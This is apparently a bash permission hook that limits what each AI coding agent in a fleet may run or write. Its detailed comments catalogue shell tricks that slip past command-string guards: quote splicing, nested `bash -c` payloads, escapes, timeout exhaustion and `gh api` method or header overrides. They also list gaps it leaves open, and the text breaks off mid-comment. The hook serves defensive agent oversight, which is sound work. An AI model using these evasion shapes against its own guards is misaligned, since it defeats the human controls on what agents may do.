#!/usr/bin/env bash
# PreToolUse: per-agent tool scoping.
#
# permissions.deny is session-scoped, so it cannot say "spec-writer may only
# write under docs/specs/" while coder writes anywhere. This hook is where the
# per-agent half of that lives. It switches on agent_type and denies the tool
# calls the agent's own Invariants section forbids, quoting the invariant back
# so the agent knows which line it hit.
#
# It fails open. A bug here must not stop the fleet working. Be clear about what
# that costs: for the per-agent half there is no second lock, because that is the
# half permissions.deny cannot express. The session-wide half - credentials,
# curl, sudo, destructive git - is denied in settings and by the sandbox whatever
# this hook does, and the sandbox is the thing that actually contains an agent.
set -euo pipefail

HOOK=PreToolUse

trap 'printf "%s [PreToolUse] unexpected error on line %s; allowing the call\n" "$(date -u "+%Y-%m-%dT%H:%M:%SZ")" "$LINENO" >&2; exit 0' ERR

log() { printf '%s [%s] %s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')" "$HOOK" "$*" >&2; }

allow() { exit 0; }

deny() {
  # $1 the reason shown to the agent.
  trap - ERR
  jq -n --arg r "$1" '{
    hookSpecificOutput: {
      hookEventName: "PreToolUse",
      permissionDecision: "deny",
      permissionDecisionReason: $r
    }
  }'
  log "denied: $1"
  exit 0
}

# Absolute, lexically normalised. No realpath: the target of a Write may not
# exist yet, and macOS has no realpath in the base system.
lex_abs() {
  local p="$1" cwd="$2" out="" seg oldifs
  case "$p" in
    /*) ;;
    "~/"*) p="$HOME/${p#\~/}" ;;
    *) p="${cwd:-/}/$p" ;;
  esac
  oldifs="$IFS"; IFS='/'; set -f; set -- $p; set +f; IFS="$oldifs"
  for seg in "$@"; do
    case "$seg" in
      ''|'.') ;;
      '..') out="${out%/*}" ;;
      *) out="$out/$seg" ;;
    esac
  done
  printf '%s\n' "${out:-/}"
}

input="$(cat)"

if ! command -v jq >/dev/null 2>&1; then
  log "jq is not installed, so per-agent scoping cannot run. Every call is allowed. Install jq (macOS: brew install jq)."
  allow
fi

if ! printf '%s' "$input" | jq -e . >/dev/null 2>&1; then
  log "hook input is not valid JSON; allowing the call"
  allow
fi

agent_type="$(printf '%s' "$input" | jq -r '.agent_type // ""')"
tool_name="$(printf '%s' "$input" | jq -r '.tool_name // ""')"
cwd="$(printf '%s' "$input" | jq -r '.cwd // ""')"
file_path="$(printf '%s' "$input" | jq -r '.tool_input.file_path // .tool_input.notebook_path // .tool_input.path // ""')"
command_str="$(printf '%s' "$input" | jq -r '.tool_input.command // ""')"
# A line continuation is a backslash and the newline after it, and the shell
# deletes both, joining the words either side. The callers below split segments
# on newlines, so without this the verb was stranded on a second segment whose
# leading token was not the command - and was skipped entirely.
command_str="${command_str//\\$'\n'/}"

# --------------------------------------------------------- quoting the command
# Quoting a word does not change which command the shell runs. Adjacent quoted
# and unquoted pieces are joined into ONE word before the shell decides what to
# execute, so `""git`, `''git`, `g""it`, `"g"it`, `gi''t` and `"git"` are all
# the word `git` - verified by running each of them, not assumed - and so is
# `b""ash`. Two characters were enough to retire the refuter's git rule,
# coder's worktree guard, ui-designer's install ban and fleet-steward's merge
# ban at once, because every one of those is a targeted check rather than a
# command allowlist: `bash -c "\"\"git commit -m x"` recovered a payload whose
# leading token read as `""git`, which matches no branch, and a real shell ran
# git commit.
#
# The quotes come off here, before anything else reads the string, because that
# is the one place that serves leading_token, sub_verb and install_verb at the
# same time - and because strip_quoted, further down, ERASES a quoted span, so
# by the time a segment exists the `g` of `"g"it` is already gone and no
# per-parser fix could get it back.
#
# Only INERT quotes go: a span whose content is empty or is made entirely of
# the characters a command name or a plain path can hold. Everything else keeps
# its quotes, because for everything else the quotes are load-bearing -
# `grep -R '=>' src`, `find . -name "*.ts"` and `git commit -m "a message"` all
# depend on strip_quoted still erasing that span, and unquoting them would hand
# a redirection, a glob or a word split to a check that would then deny honest
# work.
#
# The backslash-escaped forms go first and in the same pass, because that is
# how the shape arrives from an interpreter payload: the recovery below appends
# a payload exactly as written, backslashes intact, so the pair to remove in
# `bash -c "\"\"git commit"` is `\"\"` rather than `""`.
#
# A lone escaped quote that is left over then has to be hidden from the plain
# rules, or they pair it with the real quote that follows and eat the payload's
# terminator: `bash -c "git commit -m \"a b\""` would lose its closing quote,
# the recovery would find no terminated payload, and a command that denies
# today would allow. Hence the two placeholders. A guard on the pattern instead
# (`(^|[^\\])"`) was tried and is wrong for a different reason: consuming the
# preceding character stops adjacent pairs matching, so `""""git` collapsed one
# pair per pass and stayed `""git`.
#
# The placeholders are two control bytes, and a command that already contains
# one has it handed back as `\"` or `\'`. That is not a way through: the shell
# has no meaning for those bytes either, so a word holding one names a command
# that does not exist, whichever of the two ways this reads it.
#
# An ODD number of quotes is deliberately left alone. `bash -c "\"\"\"\"\"git
# commit -m x"` leaves the payload unterminated and a real shell refuses to run
# it - "unexpected EOF while looking for matching quote" - so denying it would
# add a case no real command can reach, which is the same stance this file
# already takes for a lone unterminated quote. Removing pairs leaves the odd
# one standing, the leading token stays `"git`, and nothing fires.
#
# What this is not: a shell. It reads a quote as inert on the content between
# it and the next one of its kind, with no notion of which quote is inside
# which. That is the same trade the rest of this file makes, and it errs the
# safe way - an unrecognised shape keeps its quotes and is erased by
# strip_quoted exactly as it was before.
INERT_DQ=$'\001'
INERT_SQ=$'\002'
strip_inert_quotes() {
  printf '%s' "$1" | sed -E \
    -e 's/\\"([A-Za-z0-9_./-]*)\\"/\1/g' \
    -e "s/\\\\'([A-Za-z0-9_./-]*)\\\\'/\1/g" \
    -e "s/\\\\\"/$INERT_DQ/g" \
    -e "s/\\\\'/$INERT_SQ/g" \
    -e 's/"([A-Za-z0-9_./-]*)"/\1/g' \
    -e "s/'([A-Za-z0-9_./-]*)'/\1/g" \
    -e "s/$INERT_DQ/\\\\\"/g" \
    -e "s/$INERT_SQ/\\\\'/g"
}

# Every enforce_* function below finds its segments the same way: strip_quoted
# erases quoted spans, THEN the result is split on shell operators. That order
# is exactly what let `bash -c "git commit -m x"` past every check that is not
# a plain command allowlist - strip_quoted turned the payload into
# `bash -c ""`, so the leading token of every segment was "bash", and no
# per-verb rule (the refuter's git rule, coder's worktree guard, ui-designer's
# install ban, fleet-steward's merge/push ban) concerns itself with bash. An
# allowlist role such as scout or reviewer is untouched either way, because
# bash and sh are not on their allowed-commands list and they deny on the
# outer segment before a payload would ever matter.
#
# The fix recovers the payload BEFORE strip_quoted runs, from the raw string,
# and appends it as its own newline-separated line, so it is picked up by
# every function's existing segment scan without any per-role change. The
# original segment is left in place and is still scanned as written; only the
# payload is added, never removed. This does not run a shell and is not a
# parser - it looks for the one shape named here and nothing cleverer, the
# same stance the rest of this file takes (see sub_verb's header comment).
#
# Two things one keystroke away from the plain shape are folded in rather
# than left as a second hole: a path-qualified interpreter (`/bin/bash -c`)
# is recognised on its basename, the way leading_token recognises one
# elsewhere in this file - the boundary check accepts "/" as well as
# whitespace and the shell's own operators immediately before the name, so
# it need not be spelled out as its own alternative. And bash reads its
# script from the next argument for any short-option cluster ending in `c`,
# not only the bare flag - `-lc`, `-ec`, `-xc` are all "-c plus something
# else", so the cluster is matched rather than the literal two characters.
# `env bash -c "..."` was already covered before either of those two
# changes: the boundary before "bash" is the space after "env", and that
# space does not care what token preceded it.
#
# Interpreters covered: bash, sh, zsh, dash, ksh, plain or path-qualified.
# Known and deliberately uncovered: a payload built from a variable
# (`bash -c "$VAR"`), `eval`, a heredoc, and a flag cluster that is not the
# interpreter's first argument (`bash --rcfile x -c "..."`, `bash -x -c
# "..."` as two separate arguments rather than one cluster). Each is a
# genuine gap; this hook is a role reminder, not a containment boundary, and
# none of the four can be closed by pattern-matching the command string.
#
# Also deliberately uncovered: an unterminated quote, e.g.
# `bash -c "git commit -m x`. A real shell rejects that with "unexpected EOF
# while looking for matching quote" and never runs it, so treating it as a
# bypass would add a case no real command can reach.
#
# A single pass over the whole string finds every SIBLING occurrence - two
# unrelated `-c` invocations side by side - but not a NESTED one, because the
# recovered payload of `bash -c "sh -c 'git commit -m x'"` is itself
# `sh -c 'git commit -m x'`, and a real shell runs that nesting exactly as
# written. So the single pass below is repeated over whatever the previous
# pass just found, until a pass finds nothing new, capped at a small fixed
# number of passes rather than "until empty" so a command built to nest the
# same shape many times cannot turn this into a loop. The cap bounds the work.
# It is NOT what bounds the depth, and an earlier version of this comment said
# it was - it claimed the cap caught two levels and no more, and that raising
# it would only move the limit from depth three to depth four. That was wrong
# in both halves: depths four through ten deny today, and the one shape that
# was escaping had nothing to do with the number of passes.
#
# What actually bounds the recovery is ESCAPING. A recovered payload is
# appended exactly as it appeared in the command, without undoing the
# backslash escapes a real shell strips when it reads that payload. So a quote
# still carrying its backslash is invisible to the next pass: the pattern
# below looks for a real `'` or `"` after the `-c`, and `\"` is not one.
#
# The rule that falls out of that is about quoting, not about how many
# interpreters are stacked:
#
#   Caught, however deep, when the innermost payload is single-quoted - the
#   levels above it never had to escape those quotes, so they survive as real
#   quote characters for a later pass to find. Verified to ten levels:
#     zsh -c "sh -c \"bash -c 'git commit -m x'\""
#
#   Not caught, when reaching the innermost payload would mean unescaping a
#   layer first:
#     sh -c "bash -c \"git commit -m x\""
#     bash -c "sh -c 'sh -c \"git commit -m x\"'"
#
# Closing those would mean unescaping each recovered payload between passes.
# That is a real option, deliberately not taken: it is another step further
# into emulating a shell, and it would buy nothing against someone actually
# trying, who has `bash -c "$VAR"`, `eval` and a heredoc available - all
# simpler to write than an escaped nesting, and none of them closable by
# pattern-matching the command string at all (see the uncovered-gaps list
# above). Restated once more because it is the premise this whole function
# rests on: this hook is a role reminder, not a containment boundary.
#
# The double-quoted alternative in the pattern is therefore escape-aware -
# `"([^"\\]|\\.)*"`, which ends only on an unescaped quote - while the
# single-quoted one stays `'[^']*'`. That asymmetry is deliberate and matches
# the shell: inside single quotes a backslash is not an escape, so `'a\b'` is
# a complete literal that ends at its closing quote. The same escape-aware
# form appears twice below, once in the grep pattern and once in the small
# regex that strips the quotes off a match; both must agree, or the match
# succeeds and the payload comes back empty.
#
# The single pass finds every occurrence with grep, not with a bash `while
# [[ =~ ]]` loop that peels one match off the front and re-searches the
# remainder. That first version was correct but not linear: advancing past a
# found match used `${rest#*"$match"}`, and bash's own glob-pattern removal
# for a leading-wildcard pattern against a long string is quadratic - each
# call rescans from the start, so N matches (or one match near the end of a
# long, otherwise-unmatching string) cost O(length^2). Measured: a 100
# thousand character command took over 14 seconds against this hook's own 10
# second timeout, and a command that exceeds the timeout renders no decision
# at all - for every governed role, not only the one that triggered it. The
# regex match itself was never the slow part; a command with no interpreter
# shape in it stayed fast at any length, which is what pointed at the
# advance-the-cursor step rather than the search. grep finds every
# non-overlapping match in one linear pass and prints each one on its own
# line; the second, small regex below only ever runs against one already-found
# match, never against the original string, so nothing here is proportional
# to the command's length except the one initial grep.
recover_interpreter_payloads_once() {
  local text="$1" extra="" line payload
  while IFS= read -r line; do
    [ -n "$line" ] || continue
    if [[ "$line" =~ (\'[^\']*\'|\"([^\"\\]|\\.)*\")$ ]]; then
      payload="${BASH_REMATCH[1]}"
      payload="${payload:1:${#payload}-2}"
    elif [[ "$line" =~ [[:space:]]([^[:space:]\'\"]+)$ ]]; then
      # An unquoted payload is one word by definition - `bash -c git commit`
      # runs `git` and hands "commit" to it as $0 - and it is the shape a
      # one-word payload arrives in once strip_inert_quotes has taken the
      # inert quotes off `bash -c "git"`. Without this alternative that
      # normalisation would quietly stop those payloads being recovered at
      # all, which would be a fix that broke something on its way past.
      payload="${BASH_REMATCH[1]}"
    else
      continue
    fi
    extra="$extra"$'\n'"$payload"
  done < <(printf '%s' "$text" | grep -Eo "(^|[^[:alnum:]_.-])(bash|sh|zsh|dash|ksh)[[:space:]]+-[A-Za-z]*c[[:space:]]+('[^']*'|\"([^\"\\\\]|\\\\.)*\"|[^[:space:]'\"]+)")
  printf '%s' "$extra"
}

recover_interpreter_payloads() {
  local all pass=0 found
  all="$(recover_interpreter_payloads_once "$1")"
  found="$all"
  while [ -n "$found" ] && [ "$pass" -lt 3 ]; do
    found="$(recover_interpreter_payloads_once "$found")"
    [ -n "$found" ] && all="$all"$'\n'"$found"
    pass=$((pass + 1))
  done
  printf '%s' "$all"
}

# ------------------------------------------------------------- the scan bound
# Every enforce_* branch below reads a command the same way: strip the quoted
# spans, split the result on the shell's operators, then walk each segment.
# That work is superlinear in the length of a segment, and this hook is
# registered in hooks.json with "timeout": 10. Measured end to end on
# `bash -c "` + N x `\"` + `git commit -m x"`, before this bound:
#
#     command   refuter   coder   ui-designer
#      16 KB      1.2s     1.2s      1.3s
#      32 KB      2.2s     2.1s      3.0s
#      48 KB      3.8s     4.0s      5.5s
#      64 KB      6.4s     6.3s      9.1s
#      80 KB      9.4s     9.0s     13.6s   <- ui-designer already past the timeout
#
# A hook that blows its timeout renders no decision at all, so a single absurd
# command does not merely evade the role that was slow - it turns every guard
# off for that call, for every role. That is the failure this bounds against.
#
# The length is bounded at 8192 bytes, because: the longest command in this
# repo's entire eval corpus is under 200 bytes; a deliberately generous real one
# - a long commit message, a find with a dozen paths - is a few hundred more;
# and nothing a person or an agent types comes near 8 KB.
#
# What that bound does NOT do is keep the hook fast. Length is not the cost.
# The table above is a single segment, where the parsing is paid once; the cost
# is dominated by how many segments there are, because every segment pays six to
# ten subprocess spawns of its own through leading_token, command_words,
# unescape_words and sub_verb. Measured after the byte bound shipped, scout:
#
#     200 x `git log` chained with `;`   2000 bytes    13.8s
#     200 x `ls -la`  chained with `;`   1800 bytes     9.6s
#
# Both are a quarter of SCAN_MAX and both reach the 10 second timeout. So the
# segment count is bounded too, below, and the two bounds are separate because
# they bound different quantities.
#
# Truncating is not skipping, and the difference matters. The head of the
# command is still scanned, so `git commit -m x && <80 KB of padding>` is
# still caught; skipping the checks on an over-long command would catch
# nothing and would make length itself the bypass. What a truncated scan
# gives up is a verb hiding past the bound, which is a real gap and is the
# price of not having the timeout take every role's guard down with it.
#
# The bound is applied twice, because there are two texts and either can be
# the long one: the command as submitted, and the interpreter payloads
# recovered from it. Bounding only the first would let a command just under
# the bound recover several times its own length. So the scanned text is at
# most two bounds' worth, whatever the input.
SCAN_MAX=8192

# Prints its text, truncated to the bound, and says so loudly when it does.
# $1 the text, $2 what it is, for the log line.
bound_scan() {
  local text="$1"
  if [ "${#text}" -le "$SCAN_MAX" ]; then printf '%s' "$text"; return 0; fi
  log "$2 is ${#text} bytes, $(( ${#text} - SCAN_MAX )) over the ${SCAN_MAX}-byte scan bound; scanning the first ${SCAN_MAX} bytes only, so a verb past that point will not be seen"
  printf '%s' "${text:0:$SCAN_MAX}"
}

# 16 segments, chosen by measuring rather than by taste. With this bound removed,
# on this machine, scout, which is the slowest role, against the 10 second
# timeout:
#
#     segments   `git log` each   `A=1 B=2 env xargs git -C /tmp/x log` each
#         16          1.8s                      3.8s
#         32          2.7s                      7.2s
#         64          4.9s                     13.5s
#        128          9.1s                        -
#
# The right-hand column is the most expensive segment shape found: leading
# assignments and wrapper commands make command_words loop, spawning two more
# processes per word, before either parser reaches a command word. 16 is the
# largest cap that leaves that shape comfortably inside the timeout, so it is
# still inside it on hardware two and a half times slower. 32 measures 7.2s and
# leaves no such room.
#
# With the bound in, the 16-segment row is what the hook pays whatever arrives:
# 1.8s and 4.0s, the second having risen from 3.8s when strip_leading_syntax
# was added below. Everything above 16 segments measures the same as 16.
#
# A reviewer gate segment (CF-90) is its own shape: a git rev-parse, an
# AGENTS.md read, path resolution and the flag scan on top of the usual word
# parsing. Measured end to end on 2026-09-30, every segment an allowed gate,
# in a real linked worktree, Homebrew bash 5 / macOS bash 3.2:
#
#     segments   `vitest run; ...`   `vitest run <file> -t <name>; ...`   `cd <wt> && tsc --noEmit && ...`
#         8        0.6s / 0.6s            0.7s / 0.7s                          0.7s / 0.6s
#        16        1.0s / 1.3s            1.0s / 0.9s                          0.9s / 1.0s
#
# Before the directory state and the gate list were cached per directory, and
# the assignment walk (which reads every segment) ran once per gate segment,
# the 16-segment rows were 1.7s / 1.5s and 1.5s / 1.8s. Either way the gate
# shape stays well inside the 10 second timeout at 16, so it takes no bound of
# its own.
#
# It is generous against real work by a wide margin. The coder-fleet repo's whole scope-hook
# corpus tops out at four segments, and the longest realistic command anyone has
# written against this fleet - copy the tree, change it, run the tests - is three.
SEGMENT_MAX=16

# Prints at most SEGMENT_MAX segments of its newline-separated input, and says
# so loudly when it drops the rest. $1 the segments.
#
# Blank segments are dropped BEFORE the count rather than after it. Every loop
# below skips them anyway, and counting them would have made `;;;;;;;;;;;;;;;;`
# in front of a command a one-line way of pushing the verb past this bound -
# a bound that creates its own bypass is not a bound.
bound_segments() {
  local segs total
  segs="$(printf '%s\n' "$1" | grep -v '^[[:space:]]*$' || true)"
  total="$(printf '%s' "$segs" | grep -c '' || true)"
  [ "$total" -le "$SEGMENT_MAX" ] && { printf '%s' "$segs"; return 0; }
  log "the command splits into $total segments, $(( total - SEGMENT_MAX )) over the ${SEGMENT_MAX}-segment scan bound; scanning the first ${SEGMENT_MAX} only, so a verb in a later segment will not be seen"
  printf '%s' "$segs" | head -n "$SEGMENT_MAX"
}

if [ -n "$command_str" ]; then
  command_str="$(bound_scan "$command_str" "command")"
  # Bounded first, so the normalisation is paid on at most SCAN_MAX bytes, and
  # BEFORE the recovery, so a quoted interpreter name (`b""ash -c "..."`) is the
  # interpreter the recovery is looking for. Applied to the recovered payloads
  # too, for the same reason the bound is: either text can be the one carrying
  # the shape.
  command_str="$(strip_inert_quotes "$command_str")"
  command_str="$command_str$(bound_scan "$(strip_inert_quotes "$(recover_interpreter_payloads "$command_str")")" "recovered interpreter payload")"
fi

# A plugin agent can arrive as "scout" or as "plugin-name:scout".
agent="${agent_type##*:}"

# No agent_type means the main session, which these rules do not govern.
if [ -z "$agent" ]; then allow; fi

is_write_tool() {
  case "$1" in
    Write|Edit|MultiEdit|NotebookEdit) return 0 ;;
    *) return 1 ;;
  esac
}

# ------------------------------------------------------------------ spec-writer
# Invariant: "Never write anywhere except under `docs/specs/`: not source, not
# config, not tests."
enforce_spec_writer() {
  is_write_tool "$tool_name" || return 0
  if [ -z "$file_path" ]; then
    log "spec-writer called $tool_name with no path in tool_input; allowing"
    return 0
  fi
  local abs; abs="$(lex_abs "$file_path" "$cwd")"
  case "$abs" in
    */docs/specs/*) return 0 ;;
  esac
  deny "spec-writer invariant: \"Never write anywhere except under docs/specs/: not source, not config, not tests.\" $tool_name targeted $abs. Write the spec to docs/specs/<issue>.md instead. Anything else belongs to the lead."
}

# What a backslash does, in the shell's order: before whitespace it makes that
# whitespace part of the word; anywhere else it quotes the next character and
# disappears. The placeholder keeps an escaped space from splitting a path into
# two words without pretending to know what the path says.
#
# The line-continuation case is NOT handled here - it is joined out of
# command_str before anything splits on newlines, because deleting the backslash
# without joining is what stranded the verb on a second segment.
#
# Three callers, and they used to disagree. sub_verb did this and the other two
# did not, so `git \merge main` was caught while `\git merge main` and
# `npm \install react` were not - a backslash is quoting, and quoting the
# command word or the install verb hid it from exactly the checks that read
# those words. Both were verified to run: `\git --version` prints a version,
# `npm \install` reaches npm's install.
unescape_words() {
  printf '%s' "$1" | sed -e 's/\\\([[:space:]]\)/_/g' -e 's/\\\(.\)/\1/g'
}

# The subcommand a segment would actually run: the first word after the command
# word that is not an option, and not an option's value.
#
# Two roles need it and neither is only about git - fleet-steward asks which git
# verb, ui-designer asks that AND which package-manager verb, since its
# invariant bans installing rather than bans npm. So the command word is dropped
# BY POSITION, because the shell's first word is the command whatever it is
# called.
#
# Three ways this has been got wrong, all of them live at some point:
#
#   awk '{print $2}'      read "-C" as the verb of `git -C /path log`. Against
#                         an allowlist that denies (scout, reviewer,
#                         ui-designer); against fleet-steward's denylist it
#                         ALLOWS, so `git -C /path push --force` walked past a
#                         ban. Fixed, item 17.
#   "${1#*git}"           strips to the first literal "git" in the string, so
#                         `/opt/git/bin/git merge` had a verb of "/bin/git", and
#                         `npm install react` - which contains no "git" at all -
#                         had a verb of "npm", silently retiring ui-designer's
#                         entire install ban.
#   collapsing every \.   fixed escapes in the path and broke them in the verb:
#                         `git \merge` runs merge, and read as "xerge".
#
# What it is not: a shell. `command git merge`, `env git merge` and
# `x=m; git ${x}erge` all defeat it, because a denylist over unexpanded text
# always loses to expansion. See the note in this file's header - the scope hook
# is a role reminder, not a containment boundary.
sub_verb() {
  local seg tok skip_next=no
  seg="$(command_words "$1")"
  seg="$(unescape_words "$seg")"
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $seg
  [ "$#" -gt 0 ] || { printf ''; return 0; }
  shift
  for tok in "$@"; do
    if [ "$skip_next" = yes ]; then skip_next=no; continue; fi
    case "$tok" in
      # git's global options that take a SEPARATE value, checked against the
      # installed git rather than recalled. --attr-source does take one.
      # --exec-path does NOT - it prints the path and exits - so listing it
      # here made it swallow the verb that followed. --super-prefix was
      # removed in git 2.49 and is gone from this list with it.
      -C|-c|--git-dir|--work-tree|--namespace|--attr-source|--config-env)
        skip_next=yes; continue ;;
      -*) continue ;;
      *) printf '%s' "$tok"; return 0 ;;
    esac
  done
  printf ''
}

# ----------------------------------------------------------------------- scout
# Invariants: "Never edit, write or create a file", and a Bash allowlist -
# "run only commands that read - ls, cat, head, tail, sed -n, wc, file, rg,
# grep, find, and read-only git log, git show, git blame, git diff,
# git ls-files", and read-only gh by subcommand pair (CF-84).
#
# cd, pwd, echo, true and read are allowed on top of that list because none of
# them can change state and every one of them appears inside an otherwise legal
# command - read as the head of `while read f; do ...; done`, where it sets a
# shell variable from standard input and writes nothing. That is the only
# addition; see hooks/README.md.
SCOUT_ALLOWED_CMDS=" ls cat head tail sed wc file rg grep find git gh cd pwd echo true read "
SCOUT_ALLOWED_GIT=" log show blame diff ls-files "

# gh holds the human's GitHub credential, so it is allowed by group AND
# subcommand, never by group alone: `gh issue list` reads and `gh issue close`
# writes, and only the pair tells them apart. Every pair not listed is denied,
# which covers the writing subcommands, `gh auth` (whose `token` prints the
# credential), extensions, aliases and any group gh adds later. `api` stands
# alone because its method is decided by its flags, not by a subcommand; see
# gh_api_denial. Comma-separated because the pairs contain a space. (CF-84)
SCOUT_ALLOWED_GH=",issue list,issue view,issue status,pr list,pr view,pr diff,pr checks,pr status,run list,run view,repo view,release list,release view,label list,search issues,search prs,search repos,search code,search commits,api,"

# The group and subcommand a gh segment runs, as "group sub", or "api" alone.
# Prints "option:<word>" when an option other than the repository flag stands
# in front of the pair.
#
# That last rule is what keeps the pair honest. gh parses with cobra, which,
# while it is still looking for the command, reads any flag it does not know
# as taking the next word for its value - so `gh -x issue pr merge` could be
# `-x issue` then `pr merge` to gh while a scan that skipped options read
# `issue pr`. Rather than guess which flags take a value, nothing but -R and
# --repo, in their four spellings, may stand before the pair; after it,
# options are free, because the command is already decided. Words are read
# the way sub_verb reads them: wrappers and assignments dropped, backslashes
# undone, inert quotes already gone from the command.
gh_pair() {
  local seg tok group="" skip_next=no
  seg="$(unescape_words "$(command_words "$1")")"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $seg
  set +f
  [ "$#" -gt 0 ] || { printf ''; return 0; }
  shift
  for tok in "$@"; do
    if [ "$skip_next" = yes ]; then skip_next=no; continue; fi
    case "$tok" in
      -R|--repo) skip_next=yes; continue ;;
      -R?*|--repo=*) continue ;;
      -*) printf 'option:%s' "$tok"; return 0 ;;
    esac
    if [ -z "$group" ]; then
      group="$tok"
      [ "$group" = api ] && { printf 'api'; return 0; }
      continue
    fi
    printf '%s %s' "$group" "$tok"
    return 0
  done
  printf '%s' "$group"
}

# Why a `gh api` segment is not a plain GET, or nothing when it is. An
# allowlist, because the denylist it replaced was beaten five ways in its first
# review: gh api sends a GET unless a flag says otherwise, and the shell has
# too many ways to build a flag out of a word that does not look like one.
# (CF-84 fix round 1.)
#
# What passes is one endpoint - a plain path, which may end in a query string -
# and these read flags: --paginate, --slurp, -i/--include, -q/--jq,
# -t/--template and -H/--header, whose values are separate plain words or
# follow `=`, and -X/--method GET, upper or lower case, as `-X GET`, `-XGET`,
# `-X=GET`, `--method GET` or `--method=GET`. Anything else is denied, clusters
# such as `-iX` included. A flag's value may not start with `-`, because gh
# would take `-H -f` as a header while a reader sees a field.
#
# Two were dropped in fix round 2. --cache writes cache files, and scout writes
# nothing. And a header is an Accept header or nothing: Accept only chooses how
# the answer is formatted, while another header can change what the request
# does - X-HTTP-Method-Override is the plain example - or where the
# credential goes.
# No word may hold a quote: by the time this runs a quoted span is `""` and
# what it held cannot be seen. The expansion characters are refused before
# this runs, for every gh segment, except `?`, which only the endpoint's query
# string may carry.
GH_API_ENDPOINT_RE='^[A-Za-z0-9_./-]+(\?[A-Za-z0-9_.,:%+=/-]*)?$'
GH_API_ACCEPT_RE='^[Aa][Cc][Cc][Ee][Pp][Tt]:'
gh_api_denial() {
  local seg tok state=before endpoint=""
  seg="$(unescape_words "$(command_words "$1")")"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $seg
  set +f
  for tok in "$@"; do
    # Up to `api` the words are gh and the repository flag gh_pair allowed.
    if [ "$state" = before ]; then [ "$tok" = api ] && state=flags; continue; fi
    case "$tok" in
      *\'*|*\"*) printf '"%s" is quoted, so what it says cannot be read' "$tok"; return 0 ;;
    esac
    case "$state" in
      method)
        state=flags
        case "$tok" in GET|get) continue ;; esac
        printf 'the method is "%s"' "$tok"; return 0 ;;
      value|header)
        case "$tok" in
          -*) printf 'the option value "%s" starts with -, and gh reads it as a value while it looks like a flag' "$tok"; return 0 ;;
          *\?*) printf 'the option value "%s" holds a ?, which the shell expands' "$tok"; return 0 ;;
        esac
        if [ "$state" = header ] && ! [[ $tok =~ $GH_API_ACCEPT_RE ]]; then
          printf 'the header "%s" is not an Accept header' "$tok"; return 0
        fi
        state=flags
        continue ;;
    esac
    case "$tok" in
      --paginate|--slurp|-i|--include) ;;
      -q|--jq|-t|--template) state=value ;;
      -H|--header) state=header ;;
      --jq=?*|--template=?*|--header=?*)
        case "${tok#*=}" in
          -*|*\?*) printf 'the option value in "%s" starts with - or holds a ?' "$tok"; return 0 ;;
        esac
        if [ "${tok%%=*}" = --header ] && ! [[ ${tok#*=} =~ $GH_API_ACCEPT_RE ]]; then
          printf 'the header in "%s" is not an Accept header' "$tok"; return 0
        fi ;;
      -X|--method) state=method ;;
      -XGET|-Xget|-X=GET|-X=get|--method=GET|--method=get) ;;
      -*) printf '"%s" is not one of its read flags' "$tok"; return 0 ;;
      *)
        [ -z "$endpoint" ] || { printf '"%s" is a second endpoint after "%s"' "$tok" "$endpoint"; return 0; }
        [[ $tok =~ $GH_API_ENDPOINT_RE ]] || { printf 'the endpoint "%s" is not a plain path with an optional query string' "$tok"; return 0; }
        endpoint="$tok" ;;
    esac
  done
  # A trailing -X or --method has no value, and no endpoint is no request; gh
  # refuses both itself.
  printf ''
}

# Why a gh segment's words are unsafe for any pair, or nothing. The shell
# builds words gh reads from words a reader does not: $'-f' is -f, ${IFS}-XPOST
# splits into -XPOST, -{X,}POST is two words, -* is whatever files match. So a
# gh word may not hold $, {, *, [ or a backtick, nor ? outside gh api (whose
# endpoint may carry a query string, checked above), and a word that starts
# with - may not hold a quote. --web and -w, alone or in a cluster, open a
# browser that config or the environment names, so no pair may use them.
#
# The expansion and quoting half is word_expansion_denial, shared with the
# reviewer's gate rule (CF-90), which needs the same words refused for the same
# reason: a word the shell rebuilds is a word no check here has read.
gh_words_denial() {
  local seg tok api="$2" why
  seg="$(unescape_words "$(command_words "$1")")"
  why="$(word_expansion_denial "$seg" "$([ "$api" = api ] && printf yes || printf no)")"
  [ -z "$why" ] || { printf '%s' "$why"; return 0; }
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $seg
  set +f
  for tok in "$@"; do
    case "$tok" in
      --web|--web=*) printf 'web:%s' "$tok"; return 0 ;;
    esac
    if [[ $tok =~ ^-[A-Za-z]*w[A-Za-z]*$ ]]; then printf 'web:%s' "$tok"; return 0; fi
  done
  printf ''
}

# The first word the shell would expand or re-read, as "expands:<word>" or
# "quoted:<word>", or nothing. $1 the words, already unescaped; $2 yes when a
# ? may stand (gh api's query string), anything else when it may not. $, {, *,
# [ and a backtick build words a reader never sees - $'-f' is -f, ${IFS}-XPOST
# splits, -{X,}POST is two words, -* is whatever files match - and a word
# starting with - that holds a quote is an option whose text was erased.
word_expansion_denial() {
  local tok qmark="${2:-no}"
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $1
  set +f
  for tok in "$@"; do
    case "$tok" in
      *'$'*|*'{'*|*'*'*|*'['*|*'`'*)
        printf 'expands:%s' "$tok"; return 0 ;;
    esac
    if [ "$qmark" != yes ]; then
      case "$tok" in *'?'*) printf 'expands:%s' "$tok"; return 0 ;; esac
    fi
    case "$tok" in
      -*\'*|-*\"*) printf 'quoted:%s' "$tok"; return 0 ;;
    esac
  done
  printf ''
}

# Whether xargs stands in front of gh in a segment. command_words looks
# through xargs as a wrapper, which is right for a verb check and wrong here:
# xargs appends words from standard input, so what gh runs is not in the
# command at all. Denied whatever the pair.
gh_via_xargs() {
  local tok
  set -f
  # shellcheck disable=SC2086 # deliberate word splitting: this is a word scan
  set -- $(unescape_words "$1")
  set +f
  for tok in "$@"; do
    case "${tok##*/}" in
      gh) return 1 ;;
      xargs) return 0 ;;
    esac
  done
  return 1
}

# A command that runs gh may assign no variable anywhere in it: in front of gh,
# behind env, or in an earlier segment, which reaches gh when the name is
# already exported. A list of the dangerous names was tried first and was one
# name short within a day - GH_CONFIG_DIR points gh at a config whose browser it
# then runs - and GH_HOST, GH_DEBUG and HTTPS_PROXY change where the credential
# goes. Nothing scout reads needs one.
#
# Prints the first variable any segment assigns, or nothing. An assignment is
# a NAME=value word where the shell reads one: in front of the command word,
